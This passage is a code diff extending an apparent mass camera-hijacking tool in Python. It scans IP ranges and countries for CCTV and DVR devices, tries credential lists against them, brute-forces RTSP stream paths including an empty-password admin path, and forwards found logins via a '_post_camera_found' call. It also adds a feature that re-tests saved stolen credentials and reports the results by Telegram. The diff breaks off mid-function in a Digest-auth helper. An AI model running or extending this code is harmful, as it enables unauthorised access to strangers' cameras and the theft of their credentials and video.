@@ -5550,7 +5868,8 @@ def fast_port_scan(ip: str,
             for port in results:
                 if port:
                     open_ports.append(port)
-                    if port in [80, 8000, 8080, 8081, 8082, 37777, 37778, 37779]:
+                    if port in [80, 81, 82, 83, 8000, 8080, 8081, 8082,
+                                        8090, 8091, 37777, 37778, 37779, 34567]:
                         break
     except RuntimeError:
         # OS thread limit hit — fall back to sequential scan
@@ -5599,17 +5918,49 @@ def get_rtsp_paths(camera_type: str) -> List[str]:
             '/live/ch00_0',
             '/h264/ch1/main/av_stream',
             '/live',
+            '/user=admin&password=&channel=1&stream=0.sdp',
         ]
     elif 'axis' in ct:
-        return ['/axis-media/media.amp', '/mpeg4/media.amp', '/live', '/1']
+        return [
+            '/axis-media/media.amp',
+            '/axis-media/media.amp?videocodec=h264',
+            '/mpeg4/media.amp',
+            '/live', '/1',
+        ]
     elif 'reolink' in ct:
-        return ['/h264Preview_01_main', '/h264Preview_01_sub', '/Streaming/Channels/101']
+        return [
+            '/h264Preview_01_main', '/h264Preview_01_sub',
+            '/h264Preview_01_fluent', '/Streaming/Channels/101',
+        ]
     elif 'foscam' in ct:
-        return ['/videoMain', '/videoSub', '/live', '/11']
+        return ['/videoMain', '/videoSub', '/live', '/11', '/video1']
     elif 'uniview' in ct or 'unv' in ct:
-        return ['/media/video1', '/media/video2', '/Streaming/Channels/101']
+        return ['/media/video1', '/media/video2', '/Streaming/Channels/101',
+                '/cgi-bin/realmonitor.cgi?action=getStream&channel=1&subtype=0']
     elif 'tiandy' in ct:
-        return ['/Streaming/Channels/101', '/live/ch00_0', '/cam/realmonitor?channel=1&subtype=0']
+        return ['/Streaming/Channels/101', '/live/ch00_0',
+                '/cam/realmonitor?channel=1&subtype=0', '/stream1']
+    elif 'sony' in ct:
+        return ['/image/1/live.sdp', '/image/2/live.sdp',
+                '/media/video1', '/live']
+    elif 'bosch' in ct:
+        return ['/rtsp_tunnel?channel=1', '/media/video1',
+                '/Streaming/Channels/101', '/live']
+    elif 'hanwha' in ct or 'samsung' in ct:
+        return ['/profile1/media.smp', '/profile2/media.smp',
+                '/Streaming/Channels/101', '/live']
+    elif 'annke' in ct:
+        return ['/Streaming/Channels/101', '/h264/ch1/main/av_stream',
+                '/cam/realmonitor?channel=1&subtype=0', '/live']
+    elif 'tp-link' in ct or 'tapo' in ct:
+        return ['/stream/live', '/stream/main', '/stream1', '/live']
+    elif 'amcrest' in ct:
+        return [
+            '/cam/realmonitor?channel=1&subtype=0&unicast=true',
+            '/Streaming/Channels/101',
+            '/h264/ch1/main/av_stream',
+            '/live',
+        ]
     else:
         return [
             '/Streaming/Channels/101',
@@ -5623,6 +5974,7 @@ def get_rtsp_paths(camera_type: str) -> List[str]:
             '/videoMain',
             '/media/video1',
             '/1',
+            '/user=admin&password=&channel=1&stream=0.sdp',
         ]
 
 
@@ -6362,9 +6714,21 @@ def scan_single_ip_detection_only(ip: str, ports: List[int], country_name: str =
             return None
 
         camera_ports = [
-            p for p in open_ports if p in [80, 443, 1025, 1050, 3000, 8000, 8080,
-                                           8081, 8082, 8083, 8084, 8085, 8200, 8443,
-                                           8888, 9000, 37777, 37778, 37779]
+            p for p in open_ports if p in [
+                # HTTP / web UI
+                80, 81, 82, 83, 443, 8443,
+                # HTTP alternates
+                8000, 8080, 8081, 8082, 8083, 8084, 8085, 8090, 8091,
+                8200, 8888, 9000, 9001,
+                # Dahua / DVR
+                37777, 37778, 37779, 34567, 4567,
+                4000, 4321, 2000, 2001,
+                # Brand-specific
+                7080, 8899, 9999, 18080, 18081, 6789,
+                50000, 50001,
+                # Misc
+                1025, 1050, 3000,
+            ]
         ]
         if not camera_ports:
             return None
@@ -6474,9 +6838,15 @@ def scan_single_ip_with_detection(ip: str, credentials: List[Tuple[str, str]],
             return None
 
         camera_ports = [
-            p for p in open_ports if p in [80, 443, 1025, 1050, 3000, 8000, 8080,
-                                           8081, 8082, 8083, 8084, 8085, 8200, 8443,
-                                           8888, 9000, 37777, 37778, 37779]
+            p for p in open_ports if p in [
+                80, 81, 82, 83, 443, 8443,
+                8000, 8080, 8081, 8082, 8083, 8084, 8085, 8090, 8091,
+                8200, 8888, 9000, 9001,
+                37777, 37778, 37779, 34567, 4567,
+                4000, 4321, 2000, 2001,
+                7080, 8899, 9999, 18080, 18081, 6789,
+                50000, 50001, 1025, 1050, 3000,
+            ]
         ]
 
         if not camera_ports:
@@ -7137,9 +7507,15 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]],
             return None
 
         camera_ports = [
-            p for p in open_ports if p in [80, 443, 1025, 1050, 3000, 8000, 8080,
-                                           8081, 8082, 8083, 8084, 8085, 8200, 8443,
-                                           8888, 9000, 37777, 37778, 37779]
+            p for p in open_ports if p in [
+                80, 81, 82, 83, 443, 8443,
+                8000, 8080, 8081, 8082, 8083, 8084, 8085, 8090, 8091,
+                8200, 8888, 9000, 9001,
+                37777, 37778, 37779, 34567, 4567,
+                4000, 4321, 2000, 2001,
+                7080, 8899, 9999, 18080, 18081, 6789,
+                50000, 50001, 1025, 1050, 3000,
+            ]
         ]
 
         if not camera_ports:
@@ -7206,6 +7582,8 @@ def scan_single_ip(ip: str, credentials: List[Tuple[str, str]],
                         'port': detected_port, 'message': message,
                         'open_ports': open_ports,
                     }
+                    _post_camera_found(ip, detected_port, username, password,
+                                       'HIK Vision Camera', open_ports)
                     return _result
 
                 validator = DahuaCameraValidator(ip, username, password, detected_port)
@@ -7474,7 +7852,10 @@ def _load_already_found_ips(country_code: str) -> set:
 def scan_ip_range(start_ip: str,
                   end_ip: str,
                   credentials: List[Tuple[str, str]],
-                  max_workers: int = None):
+                  max_workers: int = None,
+                  cidr_total_ips: int = 0,
+                  cidr_offset: int = 0,
+                  resume_from_ip: str = ""):
     """
     Scan IP range for cameras with multi-threaded support
     
@@ -7483,6 +7864,12 @@ def scan_ip_range(start_ip: str,
         end_ip: Ending IP address
         credentials: List of credentials to try
         max_workers: Number of threads (None = auto-detect CPU count)
+        cidr_total_ips: Total IPs across ALL chunks of a multi-block CIDR.
+                        When >0 the progress bar shows CIDR-level % instead of
+                        per-block %, preventing the bar from going >100%.
+        cidr_offset: IPs already scanned in previous chunks of the same CIDR.
+                     scanned_count starts at this value so the bar accumulates
+                     correctly across blocks.
     """
     global total_ips, scanned_count, valid_results, start_time
 
@@ -7495,28 +7882,65 @@ def scan_ip_range(start_ip: str,
             unique_ips.append(ip)
             seen_ips.add(ip)
     
-    total_ips = len(unique_ips)
-    if total_ips == 0:
+    _chunk_ips = len(unique_ips)
+    if _chunk_ips == 0:
         print(f"{Fore.RED}[!] Invalid IP range!{Style.RESET_ALL}")
         return
 
-    ports_to_scan = _cli_port_override if _cli_port_override else [80, 8000, 8080, 8081, 8082, 37777, 37778, 37779, 554, 8554, 443, 8443, 10554, 5554, 7554, 8083, 8084, 8085, 8200, 8888, 9000, 1024, 1025, 1050, 3000, 34567]  # expanded port list
+    # Use CIDR-level totals when scanning a multi-block CIDR so the progress
+    # bar never exceeds 100 % and shows whole-CIDR ETA / speed.
+    if cidr_total_ips > 0:
+        total_ips = cidr_total_ips
+    else:
+        total_ips = _chunk_ips
+
+    ports_to_scan = _cli_port_override if _cli_port_override else [
+        # ── Core HTTP / web UI ports ──────────────────────────────────────
+        80, 81, 82, 83,
+        443, 8443,
+        # ── Common camera HTTP alternates ────────────────────────────────
+        8000, 8080, 8081, 8082, 8083, 8084, 8085, 8090, 8091,
+        8200, 8888, 9000, 9001,
+        # ── Dahua SDK / DVR ports ────────────────────────────────────────
+        37777, 37778, 37779,
+        34567, 4567,          # Generic DVR
+        4000, 4321,           # DVR/NVR mgmt
+        2000, 2001,           # DVR serial / mgmt
+        # ── Brand-specific ports ─────────────────────────────────────────
+        7080,                 # ONVIF device service
+        8899,                 # XiongMai / budget IP cams
+        9999,                 # Foscam / generic
+        18080, 18081,         # Hikvision / DVR variants
+        6789,                 # Huawei / ZTE cameras
+        50000, 50001,         # P2P cloud cameras
+        # ── Misc ─────────────────────────────────────────────────────────
+        1024, 1025, 1050, 3000,
+        # ── RTSP (port-open detection only) ──────────────────────────────
+        554, 8554, 10554, 5554, 7554,
+    ]  # 45 ports — extended camera port list
     if _quick_scan_mode:
         ports_to_scan = _QUICK_PORTS
 
     if max_workers is None:
         max_workers = calculate_optimal_workers('scan')
+    # Hard cap: 50 workers × 26 ports × 8 inner threads = 10400 max sockets.
+    # calculate_optimal_workers can return 300 which OOM-kills on large CIDRs.
+    max_workers = min(max_workers, 50)
 
     print(
-        f"{Fore.CYAN}[*] Scanning {total_ips} unique IPs with {max_workers} threads{Style.RESET_ALL}"
+        f"{Fore.CYAN}[*] Scanning {_chunk_ips:,} IPs"
+        + (f" (CIDR total {total_ips:,})" if cidr_total_ips > 0 else "")
+        + f" with {max_workers} threads{Style.RESET_ALL}"
     )
     print(
         f"{Fore.YELLOW}[*] Ports to scan: {', '.join(map(str, ports_to_scan))}{Style.RESET_ALL}\n"
     )
 
     start_time = time.time()
-    valid_results.clear()
-    scanned_count = 0
+    # Only clear results on the first block of a CIDR sequence
+    if cidr_offset == 0:
+        valid_results.clear()
+    scanned_count = cidr_offset  # accumulate across CIDR blocks
     global _range_active_start, _range_active_end
     with _range_active_lock:
         _range_active_start = start_ip
@@ -7575,50 +7999,104 @@ def scan_ip_range(start_ip: str,
     _ir_tick_ev.clear()
     threading.Thread(target=_ir_ticker, daemon=True).start()
 
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        future_to_ip = {}
-        for ip in unique_ips:
-            for _retry in range(5):
+    # ── Resume: skip IPs already finished in a previous (killed) run ────────
+    _resume_skip = 0
+    if resume_from_ip:
+        try:
+            _resume_skip = unique_ips.index(resume_from_ip) + 1
+            print(f"{Fore.CYAN}[»] Resuming after {resume_from_ip} "
+                  f"— skipping first {_resume_skip:,} IPs{Style.RESET_ALL}")
+            with results_lock:
+                scanned_count += _resume_skip
+        except ValueError:
+            _resume_skip = 0  # IP not in this batch; start from beginning
+    _scan_ips = unique_ips[_resume_skip:]
+
+    # ── Sub-batch loop ────────────────────────────────────────────────────────
+    # Submits only _SCAN_SUBBATCH IPs per ThreadPoolExecutor so the OS queue
+    # never holds tens-of-thousands of pending futures at once (OOM-safe).
+    # Checkpoint written after every batch so a killed run resumes cleanly.
+    for _sb_start in range(0, max(len(_scan_ips), 1), _SCAN_SUBBATCH):
+        if _stop_requested.is_set():
+            break
+        _sb_batch = _scan_ips[_sb_start : _sb_start + _SCAN_SUBBATCH]
+        if not _sb_batch:
+            break
+        _sb_num   = _sb_start // _SCAN_SUBBATCH + 1
+        _sb_total = (len(_scan_ips) + _SCAN_SUBBATCH - 1) // _SCAN_SUBBATCH
+        if _sb_total > 1:
+            sys.stdout.write(
+                f"\r\033[K{Fore.CYAN}[Sub-batch {_sb_num}/{_sb_total}]"
+                f" {len(_sb_batch):,} IPs{Style.RESET_ALL}\n")
+            sys.stdout.flush()
+
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            future_to_ip = {}
+            for ip in _sb_batch:
+                for _retry in range(5):
+                    try:
+                        future_to_ip[executor.submit(scan_single_ip, ip, credentials, ports_to_scan)] = ip
+                        break
+                    except RuntimeError:
+                        time.sleep(2 ** _retry * 0.5)
+                # silently skip the IP if all retries failed (OS still thread-starved)
+
+            # _iter_with_timeout() replaces as_completed(): exits cleanly on stall
+            for future in _iter_with_timeout(future_to_ip, _SCAN_STALL_TIMEOUT):
+                ip = future_to_ip[future]
                 try:
-                    future_to_ip[executor.submit(scan_single_ip, ip, credentials, ports_to_scan)] = ip
-                    break
-                except RuntimeError:
-                    time.sleep(2 ** _retry * 0.5)
-            # silently skip the IP if all retries failed (OS still thread-starved)
-
-        # _iter_with_timeout() replaces as_completed(): exits cleanly on stall
-        for future in _iter_with_timeout(future_to_ip, _SCAN_STALL_TIMEOUT):
-            ip = future_to_ip[future]
-            try:
-                result = future.result(timeout=5)
-                with results_lock:
-                    scanned_count += 1
-                if result:
+                    result = future.result(timeout=5)
                     with results_lock:
-                        valid_results.append(result)
-                    _ir_tick['last'] = (_ir_tick['last'] + [
-                        f"{result['ip']}:{result['port']}"
-                    ])[-3:]
-                    _cam_count = len(valid_results)
-                    sys.stdout.write('\r\033[K')  # clear ticker line before printing
-                    sys.stdout.flush()
-                    print(f"{Fore.GREEN}[✓] CAMERA FOUND!{Style.RESET_ALL} "
-                          f"{result['ip']}:{result['port']} — "
-                          f"{result['camera_type']} | "
-                          f"{result['username']}:{result['password']}")
+                        scanned_count += 1
+                    if result:
+                        with results_lock:
+                            valid_results.append(result)
+                        _ir_tick['last'] = (_ir_tick['last'] + [
+                            f"{result['ip']}:{result['port']}"
+                        ])[-3:]
+                        _cam_count = len(valid_results)
+                        sys.stdout.write('\r\033[K')  # clear ticker before print
+                        sys.stdout.flush()
+                        print(f"{Fore.GREEN}[✓] CAMERA FOUND!{Style.RESET_ALL} "
+                              f"{result['ip']}:{result['port']} — "
+                              f"{result['camera_type']} | "
+                              f"{result['username']}:{result['password']}")
 
-                # Keep the ticker thread in sync so it shows accurate numbers
-                _ir_tick['sc']    = scanned_count
-                _ir_tick['found'] = len(valid_results)
-                _ir_tick['w']     = max_workers
+                    # Keep the ticker thread in sync so it shows accurate numbers
+                    _ir_tick['sc']    = scanned_count
+                    _ir_tick['found'] = len(valid_results)
+                    _ir_tick['w']     = max_workers
 
-            except Exception:
-                with results_lock:
-                    scanned_count += 1
+                except Exception:
+                    with results_lock:
+                        scanned_count += 1
+
+        # ── Checkpoint after every sub-batch ─────────────────────────────────
+        # If OOM-killed mid-range, the next run finds this and resumes here.
+        try:
+            save_scan_progress(
+                country_code=_ir_range_label,
+                country_name=f"IP Range {_ir_range_label}",
+                scanned=scanned_count,
+                total=total_ips,
+                last_ip_in_range=_sb_batch[-1],
+                output_file=(
+                    cctv_output_file
+                    if cctv_output_file
+                    else os.path.join(SCRIPT_DIR, 'range_scan_found.txt')
+                ),
+                stop_reason=''
+            )
+        except Exception:
+            pass
 
     # Stop the background progress ticker and progress saver before finishing
     _ir_tick_ev.set()
     _bg_saver_stop.set()
+    try:
+        _ir_bg_saver_t.join(timeout=3)  # ensure saver exits before next block starts
+    except Exception:
+        pass
     print()  # move past the \r progress line
 
     stop_scan_dashboard()
@@ -8034,7 +8512,30 @@ def scan_country_cameras(country: dict,
         return
 
     total_ips = ip_count
-    ports_to_scan = _cli_port_override if _cli_port_override else [80, 8000, 8080, 8081, 8082, 37777, 37778, 37779, 554, 8554, 443, 8443, 10554, 5554, 7554, 8083, 8084, 8085, 8200, 8888, 9000, 1024, 1025, 1050, 3000, 34567]  # expanded port list
+    ports_to_scan = _cli_port_override if _cli_port_override else [
+        # ── Core HTTP / web UI ports ──────────────────────────────────────
+        80, 81, 82, 83,
+        443, 8443,
+        # ── Common camera HTTP alternates ────────────────────────────────
+        8000, 8080, 8081, 8082, 8083, 8084, 8085, 8090, 8091,
+        8200, 8888, 9000, 9001,
+        # ── Dahua SDK / DVR ports ────────────────────────────────────────
+        37777, 37778, 37779,
+        34567, 4567,          # Generic DVR
+        4000, 4321,           # DVR/NVR mgmt
+        2000, 2001,           # DVR serial / mgmt
+        # ── Brand-specific ports ─────────────────────────────────────────
+        7080,                 # ONVIF device service
+        8899,                 # XiongMai / budget IP cams
+        9999,                 # Foscam / generic
+        18080, 18081,         # Hikvision / DVR variants
+        6789,                 # Huawei / ZTE cameras
+        50000, 50001,         # P2P cloud cameras
+        # ── Misc ─────────────────────────────────────────────────────────
+        1024, 1025, 1050, 3000,
+        # ── RTSP (port-open detection only) ──────────────────────────────
+        554, 8554, 10554, 5554, 7554,
+    ]  # 45 ports — extended camera port list
     if _quick_scan_mode:
         ports_to_scan = _QUICK_PORTS
 
@@ -8164,6 +8665,18 @@ def scan_country_cameras(country: dict,
                 os.remove(cctv_output_file)
         except Exception:
             pass
+
+    # Save initial found_count=0 so mood indicator always has a key to read
+    try:
+        _prog_path_combo = os.path.join(SCRIPT_DIR, 'scan_progress.json')
+        if os.path.exists(_prog_path_combo):
+            with open(_prog_path_combo, 'r', encoding='utf-8') as _pf_c:
+                _pd_c = json.load(_pf_c)
+            _pd_c['found_count'] = 0
+            with open(_prog_path_combo, 'w', encoding='utf-8') as _pf_c:
+                json.dump(_pd_c, _pf_c, indent=2)
+    except Exception:
+        pass
 
     _combo_last_log         = time.time()
     _combo_last_tg          = time.time() - 25  # trigger first update quickly
@@ -8776,6 +9289,216 @@ def find_valid_camera_files() -> List[str]:
 
     return sorted(valid_files)
 
+
+
+
+def re_verify_saved_cameras(max_workers: int = 20) -> None:
+    """
+    TASK-B: Re-verify all cameras in ValidCamera files.
+    For each camera, retries login with saved credentials and marks it:
+      ALIVE        — credentials still work
+      DEAD         — IP unreachable / all ports closed
+      CRED_CHANGED — IP reachable but saved creds rejected (camera changed password)
+    Removes DEAD entries and rewrites the file. Optionally sends a Telegram summary.
+    """
+    C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
+    files = find_valid_camera_files()
+    if not files:
+        print(f"{Y}[!] No ValidCamera files found.{W}")
+        return
+
+    # ── Let user choose file(s) ──────────────────────────────────────────────
+    print(f"\n{C}{'─'*60}{W}")
+    print(f"{G}  Re-Verify Saved Cameras{W}")
+    print(f"{C}{'─'*60}{W}")
+    print(f"  Tests saved credentials against live cameras.")
+    print(f"  DEAD cameras are removed; CRED_CHANGED cameras are flagged.\n")
+    for i, fp in enumerate(files, 1):
+        print(f"  {Y}{i}.{W} {os.path.basename(fp)}")
+    print(f"  {Y}a.{W} All files")
+    print(f"  {Y}b.{W} Back")
+    try:
+        _ch = input(f"{G}Choice: {W}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        return
+    if _ch in ('b', 'back', ''):
+        return
+    if _ch == 'a':
+        selected = files
+    else:
+        try:
+            selected = [files[int(_ch) - 1]]
+        except (ValueError, IndexError):
+            print(f"{R}[!] Invalid choice.{W}")
+            return
+
+    # ── Ask whether to auto-remove DEAD entries ──────────────────────────────
+    try:
+        _do_remove = input(f"{G}Auto-remove DEAD cameras from file? (y/N): {W}").strip().lower()
+        auto_remove = _do_remove in ('y', 'yes')
+    except (EOFError, KeyboardInterrupt):
+        auto_remove = False
+
+    _total_alive = _total_dead = _total_changed = 0
+
+    for fp in selected:
+        print(f"\n{C}[→] {os.path.basename(fp)}{W}")
+        # ── Parse cameras from file ──────────────────────────────────────────
+        cameras = _parse_valid_camera_file(fp)
+        if not cameras:
+            print(f"  {Y}[!] No parseable camera entries found.{W}")
+            continue
+
+        print(f"  {C}{len(cameras)} cameras to re-verify (threads: {max_workers}){W}")
+        results = {'alive': [], 'dead': [], 'changed': []}
+        _lock = __import__('threading').Lock()
+
+        def _verify_one(cam):
+            ip   = cam.get('ip', '')
+            port = int(cam.get('port', 80))
+            user = cam.get('username', '')
+            pwd  = cam.get('password', '')
+            ctype = cam.get('camera_type', '')
+            if not ip:
+                return
+            # Step 1: check if IP is reachable (any port open)
+            try:
+                import socket as _s
+                _sock = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
+                _sock.settimeout(3.0)
+                _reachable = (_sock.connect_ex((ip, port)) == 0)
+                _sock.close()
+            except Exception:
+                _reachable = False
+            if not _reachable:
+                with _lock:
+                    results['dead'].append(cam)
+                    print(f"  {R}[DEAD]{W} {ip}:{port}")
+                return
+            # Step 2: try login with saved credentials
+            try:
+                if 'dahua' in ctype.lower() or 'anjhua' in ctype.lower():
+                    v = DahuaCameraValidator(ip, user, pwd, port)
+                    v.timeout = 3.0
+                    ok, _ = v.validate()
+                else:
+                    v = HikvisionCameraValidator(ip, user, pwd, port)
+                    v.timeout = 3.0
+                    ok, _ = v.validate()
+            except Exception:
+                ok = False
+            if ok:
+                with _lock:
+                    results['alive'].append(cam)
+                    print(f"  {G}[ALIVE]{W} {ip}:{port} {user}:{pwd}")
+            else:
+                with _lock:
+                    results['changed'].append(cam)
+                    print(f"  {Y}[CRED_CHANGED]{W} {ip}:{port} — was {user}:{pwd}")
+
+        from concurrent.futures import ThreadPoolExecutor as _TPE
+        with _TPE(max_workers=max_workers) as ex:
+            list(ex.map(_verify_one, cameras))
+
+        alive   = len(results['alive'])
+        dead    = len(results['dead'])
+        changed = len(results['changed'])
+        _total_alive   += alive
+        _total_dead    += dead
+        _total_changed += changed
+
+        print(f"\n  {G}✓ ALIVE: {alive}{W}  {R}✗ DEAD: {dead}{W}  {Y}⚠ CRED_CHANGED: {changed}{W}")
+
+        # ── Rewrite file without DEAD cameras ────────────────────────────────
+        if auto_remove and dead > 0:
+            keep = results['alive'] + results['changed']
+            _rewrite_valid_camera_file(fp, keep, dead_removed=dead)
+            print(f"  {G}[✓] Removed {dead} dead entries from {os.path.basename(fp)}{W}")
+
+    # ── Telegram summary ─────────────────────────────────────────────────────
+    if TELEGRAM_CONFIG.get('enabled'):
+        _msg  = f"\U0001f4cb <b>Re-Verify Complete</b>\n"
+        _msg += f"\u2705 Alive: <b>{_total_alive}</b>\n"
+        _msg += f"\u274c Dead: <b>{_total_dead}</b>\n"
+        _msg += f"\u26a0\ufe0f Cred Changed: <b>{_total_changed}</b>\n"
+        if auto_remove:
+            _msg += f"\U0001f5d1 Dead entries removed from files."
+        send_telegram_message(_msg)
+
+    print(f"\n{G}[✓] Re-verify done. Alive: {_total_alive}  Dead: {_total_dead}  "
+          f"Cred changed: {_total_changed}{W}")
+
+
+def _parse_valid_camera_file(filepath: str) -> list:
+    """
+    Parse cameras from a ValidCamera txt file.
+    Returns list of dicts with ip, port, username, password, camera_type.
+    """
+    cameras = []
+    cam = {}
+    try:
+        with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
+            for line in f:
+                line = line.strip()
+                if line.startswith('Camera Type:'):
+                    if cam.get('ip'):
+                        cameras.append(cam)
+                    cam = {'camera_type': line.split(':', 1)[1].strip()}
+                elif line.startswith('IP') and ':' in line and 'IP Address' not in line:
+                    parts = line.split(':', 2)
+                    cam['ip']   = parts[1].strip()
+                    cam['port'] = int(parts[2].strip()) if len(parts) > 2 else 80
+                elif line.startswith('IP Address:'):
+                    _raw = line.split(':', 1)[1].strip()
+                    if ':' in _raw:
+                        _ip_part, _, _pt_part = _raw.rpartition(':')
+                        cam['ip']   = _ip_part.strip()
+                        try:
+                            cam['port'] = int(_pt_part.strip())
+                        except ValueError:
+                            cam['port'] = 80
+                    else:
+                        cam['ip']   = _raw
+                        cam['port'] = cam.get('port', 80)
+                elif line.startswith('Port:'):
+                    try:
+                        cam['port'] = int(line.split(':', 1)[1].strip())
+                    except ValueError:
+                        pass
+                elif line.startswith('Username:'):
+                    cam['username'] = line.split(':', 1)[1].strip()
+                elif line.startswith('Password:'):
+                    cam['password'] = line.split(':', 1)[1].strip()
+        if cam.get('ip'):
+            cameras.append(cam)
+    except Exception:
+        pass
+    return cameras
+
+
+def _rewrite_valid_camera_file(filepath: str, cameras: list, dead_removed: int = 0) -> None:
+    """Rewrite a ValidCamera file keeping only the supplied camera entries."""
+    try:
+        lines = []
+        sep = '=' * 60
+        lines.append(sep)
+        lines.append(f'Valid Camera Count Summary (after re-verify; {dead_removed} dead removed)')
+        lines.append(sep)
+        lines.append(f'Total Valid Camera Count: {len(cameras)}')
+        lines.append(sep)
+        lines.append('')
+        for cam in cameras:
+            lines.append(sep)
+            lines.append(f"Camera Type: {cam.get('camera_type', 'Unknown')}")
+            lines.append(f"IP Address: {cam.get('ip', '')}:{cam.get('port', 80)}")
+            lines.append(f"Username: {cam.get('username', '')}")
+            lines.append(f"Password: {cam.get('password', '')}")
+            lines.append(sep)
+            lines.append('')
+        with open(filepath, 'w', encoding='utf-8') as f:
+            f.write('\n'.join(lines))
+    except Exception as e:
+        print(f"{Fore.RED}[!] Could not rewrite {os.path.basename(filepath)}: {e}{Style.RESET_ALL}")
 
 def merge_country_ip_files():
     """
@@ -10182,7 +10905,30 @@ def scan_country_cameras_detection_only(country: dict,
         return
 
     total_ips = ip_count
-    ports_to_scan = _cli_port_override if _cli_port_override else [80, 8000, 8080, 8081, 8082, 37777, 37778, 37779, 554, 8554, 443, 8443, 10554, 5554, 7554, 8083, 8084, 8085, 8200, 8888, 9000, 1024, 1025, 1050, 3000, 34567]  # expanded port list
+    ports_to_scan = _cli_port_override if _cli_port_override else [
+        # ── Core HTTP / web UI ports ──────────────────────────────────────
+        80, 81, 82, 83,
+        443, 8443,
+        # ── Common camera HTTP alternates ────────────────────────────────
+        8000, 8080, 8081, 8082, 8083, 8084, 8085, 8090, 8091,
+        8200, 8888, 9000, 9001,
+        # ── Dahua SDK / DVR ports ────────────────────────────────────────
+        37777, 37778, 37779,
+        34567, 4567,          # Generic DVR
+        4000, 4321,           # DVR/NVR mgmt
+        2000, 2001,           # DVR serial / mgmt
+        # ── Brand-specific ports ─────────────────────────────────────────
+        7080,                 # ONVIF device service
+        8899,                 # XiongMai / budget IP cams
+        9999,                 # Foscam / generic
+        18080, 18081,         # Hikvision / DVR variants
+        6789,                 # Huawei / ZTE cameras
+        50000, 50001,         # P2P cloud cameras
+        # ── Misc ─────────────────────────────────────────────────────────
+        1024, 1025, 1050, 3000,
+        # ── RTSP (port-open detection only) ──────────────────────────────
+        554, 8554, 10554, 5554, 7554,
+    ]  # 45 ports — extended camera port list
     if _quick_scan_mode:
         ports_to_scan = _QUICK_PORTS
 
@@ -10816,6 +11562,8 @@ def print_feature_help():
                "RTSP Brute Force, Heatmap, QR Code, CVE Checker, Diff, CSV export and more."),
         ("13", "RTSP Path Tester",
                "Single-camera probe, batch from ValidCamera files, M3U export, Quick Re-Test."),
+        ("31", "Re-Verify Saved Cameras",
+               "Re-test saved logins: marks ALIVE/DEAD/CRED_CHANGED; removes dead entries."),
     ]
     for _num, _name, _desc in _menu_opts:
         print(f"  {G}{_num:>2}.{W} {Y}{_name}{W}")
@@ -13371,27 +14119,88 @@ def rtsp_path_brute_force(ip: str, rtsp_port: int, username: str, password: str,
     """Try 60+ RTSP paths and return every URL that responds 200/401."""
     C, G, Y, W, R = Fore.CYAN, Fore.GREEN, Fore.YELLOW, Style.RESET_ALL, Fore.RED
     _paths = [
+        # Hikvision
         '/Streaming/Channels/101','/Streaming/Channels/1','/Streaming/Channels/201',
+        '/Streaming/Channels/102','/Streaming/Channels/301','/Streaming/Channels/401',
         '/h264/ch1/main/av_stream','/h264/ch01main/av_stream','/h264/ch1/sub/av_stream',
+        '/h264/ch2/main/av_stream','/h264/ch2/sub/av_stream',
+        '/PSIA/Streaming/channels/1','/PSIA/Streaming/channels/2',
+        '/Streaming/channels/101','/streaming/channels/1',
+        # Dahua
         '/cam/realmonitor?channel=1&subtype=0','/cam/realmonitor?channel=1&subtype=1',
-        '/cam/realmonitor?channel=2&subtype=0','/h264Preview_01_main','/h264Preview_01_sub',
+        '/cam/realmonitor?channel=2&subtype=0','/cam/realmonitor?channel=2&subtype=1',
+        '/h264Preview_01_main','/h264Preview_01_sub',
+        '/h264Preview_02_main','/h264Preview_02_sub',
+        '/cgi-bin/realmonitor.cgi?action=getStream&channel=1&subtype=0',
+        # Generic
         '/live','/live/ch00_0','/live/ch01_0','/live/main','/live/sub',
-        '/stream1','/stream2','/stream0','/ch0','/ch1','/ch2',
+        '/stream1','/stream2','/stream0','/stream','/ch0','/ch1','/ch2',
         '/videoMain','/videoSub','/video1','/video2','/video0',
         '/media/video1','/media/video2','/media/video0',
+        '/1/1','/2/1','/1','/2',
+        # Axis
         '/axis-media/media.amp','/mpeg4/media.amp',
-        '/onvif/profile1','/onvif/profile2','/11','/12','/13',
+        '/axis-media/media.amp?videocodec=h264',
+        # ONVIF
+        '/onvif/profile1','/onvif/profile2','/onvif/profile3',
+        # XMeye / XiongMai
+        '/user=admin&password=&channel=1&stream=0.sdp',
+        '/user=admin&password=&channel=1&stream=1.sdp',
+        # Foscam
+        '/videoMain','/videoSub',
+        '/cgi-bin/mjpg/video.cgi?channel=1&subtype=0',
+        # Sony
+        '/image/1/live.sdp','/image/2/live.sdp',
+        # TP-Link / Tapo
+        '/stream/live','/stream/main',
+        # Misc
         '/cam0_0','/cam1_0','/mpeg4','/mjpeg',
         '/videostream.asf','/img/video.asf',
-        '/Streaming/channels/101','/streaming/channels/1',
-        '/PSIA/Streaming/channels/1','/PSIA/Streaming/channels/2',
-        '/cgi-bin/realmonitor.cgi?action=getStream&channel=1&subtype=0',
-        '/cgi-bin/mjpg/video.cgi?channel=1&subtype=0',
-        '/1/1','/2/1','/1','/2',
+        '/11','/12','/13','/14',
+        # Reolink
+        '/h264Preview_01_fluent','/h264Preview_01_main',
+        # Hanwha / Samsung
+        '/profile1/media.smp','/profile2/media.smp',
+        # Bosch
+        '/rtsp_tunnel?channel=1',
+        # Amcrest
+        '/cam/realmonitor?channel=1&subtype=0&unicast=true',
     ]
     found = []
+    import hashlib as _md5_brute
+    import re as _re_brute
     creds_b64 = base64.b64encode(f'{username}:{password}'.encode()).decode()
-    print(f"\n{C}[RTSP Brute] {ip}:{rtsp_port} — trying {len(_paths)} paths...{W}")
+    print(f"\n{C}[RTSP Brute] {ip}:{rtsp_port} — trying {len(_paths)} paths (Basic + Digest)...{W}")
+
+    def _do_digest_brute(challenge_resp: str, path: str) -> Optional[str]:
+        """Attempt Digest auth using the WWW-Authenticate challenge from server."""
+        try:
+            _rm = _re_brute.search(r'realm="([^"]*)"', challenge_resp)
+            _nm = _re_brute.search(r'nonce="([^"]*)"', challenge_resp)
+            if not (_rm and _nm):
+                return None
+            _realm = _rm.group(1)
+            _nonce = _nm.group(1)
+            _ha1 = _md5_brute.md5(f'{username}:{_realm}:{password}'.encode()).hexdigest()
